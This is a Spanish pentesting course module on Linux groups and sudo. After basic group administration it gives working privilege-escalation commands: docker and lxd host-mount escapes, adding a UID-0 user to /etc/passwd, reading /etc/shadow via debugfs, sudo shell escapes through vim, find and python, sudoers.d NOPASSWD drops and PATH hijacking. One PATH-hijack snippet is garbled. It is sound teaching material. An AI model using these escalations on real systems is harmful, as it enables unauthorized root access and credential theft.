---
title: "Módulo Gestión de Grupos - Curso Linux Pentesting"
aliases:
  - Módulo Gestión de Grupos - Curso Linux Pentesting
tags:
  - ifct0109/pocs
  - linux
  - grupos
  - sudoers
---

# Curso de Linux para Pentesting

Módulo: Gestión de Grupos

  [[02 - MODULOS/Prácticas (PoCs)/Linux/01 - Curso de Linux para Pentesting|← Volver al Índice del Curso]]

## 👥 ¿Qué son los Grupos en Linux?

Los **grupos** en Linux son colecciones de usuarios que comparten permisos comunes. Sirven para organizar usuarios y gestionar el acceso a archivos y recursos del sistema de forma eficiente.

**Conceptos básicos:**

* 📌 Cada usuario pertenece al menos a un grupo primario

* 📌 Un usuario puede pertenecer a múltiples grupos secundarios

* 📌 Los archivos y directorios tienen permisos por usuario, grupo y otros

* 📌 Los grupos facilitan dar acceso a múltiples usuarios sin tener que configurarlos uno por uno

> [!warning] 🎓 Objetivo de esta sección
>        Aprenderás a:
>
>          Identificar los grupos principales del sistema
>          Ver a qué grupos pertenece un usuario
>          Crear y eliminar grupos
>          Gestionar la membresía de usuarios en grupos
>          Entender el archivo /etc/group
>          Usar sudo para elevar privilegios

## 🏷️ Grupos Principales del Sistema

Linux viene con varios grupos predefinidos. Aquí están los más importantes que debes conocer:

##### 🔴 root (GID 0)

**El grupo del superusuario.**

* GID: 0

* Propósito: Acceso administrativo total al sistema

* Miembros típicos: Usuario root

##### 🟠 sudo

**Grupo de administradores con privilegios elevados.**

* Propósito: Permite ejecutar comandos como root usando `sudo`

* Requiere: Autenticación con la contraseña del usuario

* Miembros: Usuarios que pueden administrar el sistema

##### 🟡 www-data

**Grupo del servidor web.**

* Usuarios: Procesos de Apache/Nginx

* Acceso: Directorios web (`/var/www`)

* GID típico: 33

##### 🟢 adm

**Grupo de administración del sistema.**

* Propósito: Lectura de logs del sistema

* Acceso: `/var/log` y archivos de monitorización

##### 🔵 docker

**Grupo de usuarios con acceso al daemon de Docker.**

* Propósito: Ejecutar comandos Docker sin sudo

* Acceso: Socket de Docker (`/var/run/docker.sock`)

##### 🟣 Otros Grupos Importantes

* lxd: Acceso a contenedores LXD/LXC

* disk: Acceso directo a dispositivos de disco

* video: Acceso a dispositivos de video

* audio: Acceso a dispositivos de audio

* cdrom: Montar unidades de CD/DVD

* plugdev: Montar dispositivos extraíbles

## 🔍 Ver Grupos del Sistema

### Ver Grupos de Tu Usuario

#### Comando: `groups`

Muestra los grupos a los que pertenece tu usuario actual.

tecnico@linux:~$ groups
tecnico adm cdrom sudo dip plugdev

Esto significa que `tecnico` pertenece a:

* `tecnico` - Grupo primario

* `adm` - Puede leer logs

* `cdrom` - Puede montar CD/DVD

* `sudo` - Puede ejecutar comandos como root

* `dip` - Configuración de conexiones dial-up

* `plugdev` - Puede montar USB

### Ver Grupos de Otro Usuario

#### Comando: `groups `

tecnico@linux:~$ groups root
root : root
tecnico@linux:~$ groups www-data
www-data : www-data

### Información Completa con `id`

#### Comando: `id`

Muestra UID, GID y todos los grupos.

tecnico@linux:~$ id
uid=1000(tecnico) gid=1000(tecnico) grupos=1000(tecnico),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)

**Desglose:**

* uid: User ID (identificador del usuario)

* gid: Group ID primario

* grupos: Todos los grupos (con sus GIDs)

## 📄 El Archivo /etc/group

##### Archivo: /etc/group

Contiene la información de todos los grupos del sistema.

#### Ver todos los grupos

tecnico@linux:~$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,tecnico
sudo:x:27:tecnico
www-data:x:33:
tecnico:x:1000:
# (salida abreviada)

#### 📊 Formato del archivo

```bash
nombre_grupo:contraseña:GID:lista_usuarios
```

**Ejemplo:** `sudo:x:27:tecnico`

* `sudo` - Nombre del grupo

* `x` - Campo de contraseña (obsoleto)

* `27` - GID (Group ID)

* `tecnico` - Usuarios miembros (separados por comas)

## ➕ Crear y Eliminar Grupos

### Crear un Grupo Nuevo

#### Comando: `groupadd`

Crea un nuevo grupo en el sistema.

**Sintaxis básica:**

root@linux:~# groupadd nombre_grupo

**Ejemplo práctico:**

root@linux:~# groupadd developers
root@linux:~# grep developers /etc/group
developers:x:1001:

**Crear grupo con GID específico:**

root@linux:~# groupadd -g 2000 proyecto
root@linux:~# grep proyecto /etc/group
proyecto:x:2000:

### Eliminar un Grupo

#### Comando: `groupdel`

Elimina un grupo del sistema.

root@linux:~# groupdel developers
root@linux:~# grep developers /etc/group
# No devuelve nada - el grupo fue eliminado

**⚠️ Importante:**

* No puedes eliminar un grupo si es el grupo primario de algún usuario

* Los archivos que pertenecían al grupo quedan "huérfanos" (aparece el GID en lugar del nombre)

### Modificar un Grupo

#### Comando: `groupmod`

Modifica propiedades de un grupo existente.

**Cambiar nombre del grupo:**

root@linux:~# groupmod -n nuevo_nombre viejo_nombre

**Cambiar GID:**

root@linux:~# groupmod -g 3000 proyecto

### Añadir Usuarios a un Grupo

#### Comando: `usermod -aG`

Añade un usuario a grupos secundarios.

root@linux:~# usermod -aG developers tecnico
root@linux:~# groups tecnico
tecnico : tecnico adm cdrom sudo dip plugdev developers

**⚠️ IMPORTANTE: Siempre usa `-aG`**

* `-a` (append) - Añade al grupo sin quitar los anteriores

* `-G` - Especifica grupos secundarios

* Sin `-a` eliminarías todos los grupos anteriores ❌

**Añadir a múltiples grupos a la vez:**

root@linux:~# usermod -aG developers,docker,admin tecnico

## 🔐 El Comando sudo

**sudo** (Super User DO) permite ejecutar comandos con privilegios de root.

### Uso Básico

**Ejecutar un comando como root:**

tecnico@linux:~$ sudo apt update
[sudo] password for tecnico: # Introduce tu contraseña
Hit:1 http://deb.debian.org/debian bullseye InRelease
...

**Abrir shell como root:**

tecnico@linux:~$ sudo -i
root@linux:~# # Ahora eres root

**Ejecutar comando como otro usuario:**

tecnico@linux:~$ sudo -u www-data whoami
www-data

### Ver Permisos sudo

#### Comando: `sudo -l`

Lista qué comandos puedes ejecutar con sudo.

tecnico@linux:~$ sudo -l
User tecnico may run the following commands on linux:
    (ALL : ALL) ALL

**Interpretación:**

* `(ALL : ALL) ALL` = Puede ejecutar cualquier comando como cualquier usuario

* Si ves `NOPASSWD:` = No requiere contraseña

* Si ves rutas específicas = Solo puede ejecutar esos comandos

### El Archivo /etc/sudoers

##### Archivo: /etc/sudoers

Define quién puede usar sudo y qué pueden hacer.

**⚠️ NUNCA edites directamente.** Usa: `sudo visudo`

**Ver configuración:**

tecnico@linux:~$ sudo cat /etc/sudoers
# User privilege specification
root    ALL=(ALL:ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# Ejemplo de permiso limitado
usuario ALL=(ALL) NOPASSWD: /usr/bin/apt

**Líneas importantes:**

* `%sudo ALL=(ALL:ALL) ALL` - El grupo sudo tiene acceso total (el % indica grupo)

* `NOPASSWD:` - No pide contraseña

* `ALL=(ALL:ALL)` - Puede ejecutar como cualquier usuario/grupo

### Directorio /etc/sudoers.d/

Permite crear archivos de configuración modulares.

**Ver archivos adicionales:**

tecnico@linux:~$ ls /etc/sudoers.d/
README

**Ventajas:**

* ✅ Configuración modular por usuario o aplicación

* ✅ Más fácil de mantener

* ✅ Los paquetes pueden añadir sus propias reglas

## ⚔️ Aplicaciones en Pentesting y Hacking Ético

A continuación encontrarás información avanzada sobre cómo se utilizan los grupos en pentesting, vectores de escalada de privilegios y técnicas de explotación.

💡 Haz clic en cada sección para expandir el contenido

## 🎯 Vectores de Escalada de Privilegios

      ⚠️ Escalada vía Grupo sudo

#### Vector de Ataque: Membresía en grupo sudo

Si un usuario comprometido pertenece al grupo `sudo`, tienes **acceso root directo**.

#### 🔍 Enumeración

Tras comprometer un usuario, lo primero que debes verificar:

www-data@target:~$ groups
www-data sudo # ¡El usuario está en sudo!
www-data@target:~$ sudo -l
User www-data may run the following commands:
    (ALL : ALL) ALL

#### ⚡ Explotación

# Si conoces la contraseña:
www-data@target:~$ sudo -i
[sudo] password for www-data:
root@target:~# # ¡Root!

# Si tiene NOPASSWD:
www-data@target:~$ sudo su
root@target:~# # ¡Root sin contraseña!

**🎯 Recomendación:** En pentesting, SIEMPRE ejecuta `sudo -l` tras comprometer un usuario.

      🐳 Escalada vía Grupo docker

#### Vector de Ataque: Membresía en grupo docker

Pertenecer al grupo `docker` es prácticamente equivalente a tener root. Puedes montar el filesystem completo en un contenedor.

#### 🔍 Detección

usuario@target:~$ groups
usuario docker
usuario@target:~$ docker ps
CONTAINER ID   IMAGE     COMMAND   ... # Funciona sin sudo

#### ⚡ Explotación - Método 1: Montar filesystem

# Montar el filesystem raíz en un contenedor Alpine
usuario@target:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
root@container:/# # Ahora tienes acceso root al sistema host
root@container:/# cat /etc/shadow
root:$6$xyz...  # Acceso total

#### ⚡ Explotación - Método 2: Crear usuario root

# Añadir usuario con UID 0 al /etc/passwd del host
usuario@target:~$ docker run -v /:/mnt --rm -it alpine sh -c \
  'echo "hacker::0:0::/root:/bin/bash" >> /mnt/etc/passwd'
usuario@target:~$ su hacker
root@target:~# # ¡Root sin contraseña!

**💡 Defensa:** Nunca añadas usuarios no privilegiados al grupo docker a menos que realmente necesiten acceso total al sistema.

      📦 Escalada vía Grupo lxd

#### Vector de Ataque: Membresía en grupo lxd

Similar a docker, el grupo `lxd` permite crear contenedores privilegiados con acceso al filesystem del host.

#### 🔍 Detección

usuario@target:~$ groups
usuario lxd

#### ⚡ Explotación

# 1. Importar una imagen Alpine (en máquina atacante)
atacante:~$ git clone https://github.com/saghul/lxd-alpine-builder
atacante:~$ cd lxd-alpine-builder
atacante:~$ ./build-alpine

# 2. Transferir alpine.tar.gz a la víctima

# 3. En la víctima, importar y ejecutar
usuario@target:~$ lxc image import alpine.tar.gz --alias exploit
usuario@target:~$ lxc init exploit privesc -c security.privileged=true
usuario@target:~$ lxc config device add privesc host disk source=/ path=/mnt/root recursive=true
usuario@target:~$ lxc start privesc
usuario@target:~$ lxc exec privesc /bin/sh
root@privesc:~# cd /mnt/root/root
# Acceso total al filesystem del host

      💾 Escalada vía Grupo disk

#### Vector de Ataque: Membresía en grupo disk

El grupo `disk` da acceso de lectura/escritura directa a los dispositivos de disco en `/dev`, permitiendo leer todo el filesystem.

#### ⚡ Explotación - Leer /etc/shadow

# Encontrar el disco que contiene /
usuario@target:~$ df /etc/shadow
Filesystem     1K-blocks    Used Available Use% Mounted on
/dev/sda1       20511312 8234156  11211412  43% /

# Usar debugfs para leer archivos directamente del disco
usuario@target:~$ debugfs /dev/sda1
debugfs 1.45.5 (07-Jan-2020)
debugfs: cat /etc/shadow
root:$6$xyz123...:18995:0:99999:7:::
usuario:$6$abc789...:18995:0:99999:7:::

#### ⚡ Explotación - Sobrescribir archivos

También puedes escribir directamente en el disco para modificar archivos críticos del sistema.

      🔓 Explotación de sudo con binarios específicos

#### Vector de Ataque: Permisos sudo limitados a binarios explotables

Incluso si un usuario solo puede ejecutar ciertos comandos con sudo, muchos binarios permiten escapar a una shell de root.

#### 🔍 Enumeración

usuario@target:~$ sudo -l
User usuario may run the following commands:
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/python3

#### ⚡ Explotación - vim

usuario@target:~$ sudo vim -c ':!/bin/sh'
root@target:# # Shell de root desde vim

# O desde dentro de vim:
# :set shell=/bin/sh
# :shell

#### ⚡ Explotación - find

usuario@target:~$ sudo find . -exec /bin/sh \; -quit
root@target:# # Shell de root

#### ⚡ Explotación - python3

usuario@target:~$ sudo python3 -c 'import os; os.system("/bin/bash")'
root@target:# # Shell de root

# O con pty:
usuario@target:~$ sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
root@target:#

> [!warning] 🎯 GTFOBins - Tu mejor amigo
>            Visita  GTFOBins  para encontrar formas de explotar binarios con sudo.
>             Binarios comúnmente explotables:
>
>              Editores: vim, nano, emacs, less, more
>              Lenguajes: python, perl, ruby, php, node
>              Utilidades: find, awk, sed, tar, zip
>              Shells alternativos: sh, bash, zsh

      🛣️ PATH Hijacking y secure_path

#### Ataque: PATH Hijacking

Consiste en manipular la variable `$PATH` para que sudo ejecute un binario malicioso en lugar del legítimo.

#### ⚡ Escenario Vulnerable (sin secure_path)

# 1. Crear binario malicioso
atacante@target:~$ cd /tmp
atacante@target:/tmp$ cat > cat atacante@target:/tmp$ chmod +x cat

# 2. Modificar PATH
atacante@target:/tmp$ export PATH=/tmp:$PATH

# 3. Ejecutar comando que use 'cat' con sudo
atacante@target:/tmp$ sudo cat /etc/shadow
root@target:# # ¡Ejecutó NUESTRO cat malicioso como root!

#### 🛡️ Mitigación: secure_path

La directiva `secure_path` en `/etc/sudoers` previene este ataque:

Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

**Con secure_path activo:**

atacante@target:/tmp$ sudo cat /etc/shadow
root:$6$xyz...  # Ejecuta /usr/bin/cat (el legítimo)

> [!warning] ⚠️ Limitación de secure_path
>            `secure_path` SOLO protege cuando ejecutas comandos  sin ruta explícita :
>
>              ✅ Protegido: `sudo cat archivo`
>              ❌ NO protegido: `sudo ./cat archivo` (ruta relativa)
>              ❌ NO protegido: `sudo /tmp/cat archivo` (ruta absoluta)

      📁 Explotación de /etc/sudoers.d/

#### Vector de Ataque: Permisos de escritura en /etc/sudoers.d/

Si puedes escribir en `/etc/sudoers.d/`, puedes otorgarte privilegios sudo completos.

#### 🔍 Detección

usuario@target:~$ ls -ld /etc/sudoers.d/
drwxrwxr-x 2 root adm 4096 Feb  5 10:30 .
# ¡Permisos de escritura para el grupo adm!

usuario@target:~$ groups
usuario adm
# Y perteneces a un grupo con acceso de escritura

#### ⚡ Explotación

# Crear archivo de configuración malicioso
usuario@target:~$ echo "usuario ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/pwned

# Establecer permisos correctos
usuario@target:~$ chmod 0440 /etc/sudoers.d/pwned

# ¡Ahora tienes sudo sin contraseña!
usuario@target:~$ sudo -i
root@target:~# # Root sin contraseña

> [!warning] 📝 Requisitos de archivos en /etc/sudoers.d/
>
>              Permisos: `0440` (r--r-----)
>              Propietario: root:root
>              NO pueden contener puntos (.)
>              NO pueden terminar en tilde (~)

      🔍 Checklist de Enumeración Post-Compromiso

#### 📋 Comandos Esenciales tras Comprometer un Usuario

**1. Verificar grupos del usuario actual:**

victima@target:~$ groups
victima@target:~$ id

**2. Verificar permisos sudo:**

victima@target:~$ sudo -l
# Busca: NOPASSWD, binarios explotables, directorios escribibles

**3. Buscar archivos con SUID del grupo actual:**

victima@target:~$ find / -group $(id -gn) -perm -4000 2>/dev/null

**4. Verificar permisos de escritura en directorios críticos:**

victima@target:~$ ls -ld /etc/sudoers.d/
victima@target:~$ ls -ld /etc/cron.d/

**5. Enumerar todos los usuarios y sus grupos:**

victima@target:~$ cat /etc/passwd
victima@target:~$ cat /etc/group

**6. Buscar grupos "interesantes":**

victima@target:~$ grep -E 'docker|lxd|sudo|adm' /etc/group

#### 🎯 Prioridad de Escalada

**Orden de explotación recomendado:**

* `sudo -l` - Si tienes sudo, es el camino más directo

* Grupo `docker` o `lxd` - Escalada trivial

* Grupo `disk` - Acceso a todo el filesystem

* Permisos de escritura en `/etc/sudoers.d/`

* SUID binaries explotables

* Otros vectores (cron jobs, capabilities, kernels antiguos, etc.)

  [[02 - MODULOS/Prácticas (PoCs)/Linux/01 - Curso de Linux para Pentesting|← Volver al Índice del Curso]]

Módulo: Gestión de Grupos - Curso de Linux para Pentesting

      **Manuel Fernández Ramos** | Versión 202302 v4.0

---

## 🔗 Navegación
* 🐧 [[02 - MODULOS/Prácticas (PoCs)/Linux/01 - Curso de Linux para Pentesting|Volver al Portal del Curso de Linux]]
* 🗂️ [[02 - MODULOS/Prácticas (PoCs)/Linux/00 - Índice del Módulo Linux|Índice General de Linux]]
